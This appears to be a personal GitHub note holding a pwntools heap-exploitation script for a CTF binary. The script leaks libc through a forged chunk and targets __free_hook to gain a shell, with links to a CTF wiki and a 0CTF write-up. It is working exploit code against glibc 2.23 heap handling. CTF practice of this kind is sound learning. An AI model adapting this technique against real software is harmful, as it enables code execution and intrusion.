# Container images, text,... for my Github.

https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/unsorted_bin_attack/

```python 
#!/usr/bin/env python3 
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.2.23.so')
context.log_level = 'DEBUG'
p = elf.process()

gdb.attach(p, '''
	b *createHeap
	b *showHeap
	b *editHeap
	b *deleteHeap
''')

def Create(index, size, data):
        p.sendlineafter(b'>', str(1))
        p.sendlineafter(b'Index:', str(index))
        p.sendlineafter(b'size:', str(size))
        p.sendlineafter(b'data:', data)

def Show(index):
        p.sendlineafter(b'>', str(2))
        p.sendlineafter(b'Index:', str(index))
        p.recvuntil(b'Data = ')
        leak = p.recvuntil(b'\n')
        return u64(leak.replace(b'\n', b'').ljust(8, b'\x00'))

def Edit(index, newSize, data):
        p.sendlineafter(b'>', str(3))
        p.sendlineafter(b'index:', str(index))
        p.sendlineafter(b'newsize:', str(newSize))
        p.recvline()
        p.sendline(b'y')
        p.sendlineafter(b'data:', data)

def Delete(index):
        p.sendlineafter(b'>', str(4))
        p.sendlineafter(b'index:', str(index))


Create(0, int(0xf8), b'0'*0xf7)
Create(1, int(0x68), b'1'*0x67)
Create(2, int(0xf8), b'2'*0xf7)
Create(3, int(0x10), b'/bin/sh' + b'\x00'*(0xf-7))
Delete(0)
Edit(1, int(0x68), b'1'*0x60 + p64(0x170))
Delete(2)


Create(0, int(0xf0), b'0'*0xf0)


leak = Show(1)
main_arena = leak - 88
libc_base = main_arena - libc.symbols['main_arena']
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
fake_chunk = free_hook - 0x2d

log.success('main_arena address:  ' + hex(main_arena))
log.success('Libc base address:   ' + hex(libc_base))
log.success('System address:      ' + hex(system))
log.success('__free_hook address: ' + hex(free_hook))
log.success('Fake chunk address:  ' + hex(fake_chunk))

Edit(1, int(0x68), p64(leak) + p64(fake_chunk))
Create(4, int(0x160), b'4'*0x160)
Delete(1)
Delete(4)

# Create(4, int(0x68), b'4'*0x68)
# Create(5, int(0x68), b'5'*0x68)
# Create(6, int(0x68), b'6'*0x68)

# Delete(4)
# Delete(5)

# Edit(1, int(0x68), p64(free_hook - 0x20))

# Create(4, int(0x68), b'4'*0x68)
# Create(5, int(0x68), b'5'*0x68)
# Create(7, int(0x68), b'7'*0x10 + p64(system))

# Delete(3)

p.interactive()
```

https://dangokyo.me/2017/12/14/0ctf-2016-quals-pwn-zerostorage-write-up/
